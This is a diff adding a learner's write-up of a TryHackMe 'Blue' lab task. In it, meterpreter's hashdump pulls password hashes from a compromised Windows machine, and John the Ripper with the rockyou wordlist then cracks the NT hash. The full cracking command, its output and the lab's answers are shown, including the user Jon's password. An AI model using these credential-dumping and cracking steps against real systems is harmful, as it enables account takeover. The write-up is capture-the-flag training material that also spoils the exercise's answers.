@@ -1,0 +1,29 @@
+Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+
+===>>>> Jon
+
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+=========================================== CRACKING PROCEDURE ================================================
+
+First Copy the Hashes in a file (Eg: Here in All.txt file, hashes are stored)
+
+Now run the following command
+
+┌─[hamza@hamza]─[/media/hamza/DATA/USB-LINUX-DATA/Documents/TryHackMe/Blue/Hashes]
+└──╼ $john --format=NT --rules --wordlist=/usr/share/wordlists/rockyou.txt All.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+                 (Administrator)
+alqfna22         (Jon)
+2g 0:00:00:09 DONE (2021-09-14 05:12) 0.2089g/s 1065Kp/s 1065Kc/s 1066KC/s alqui..alpusidi
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed
+
+===============================================================================================================
+
+===>>>> alqfna22
+
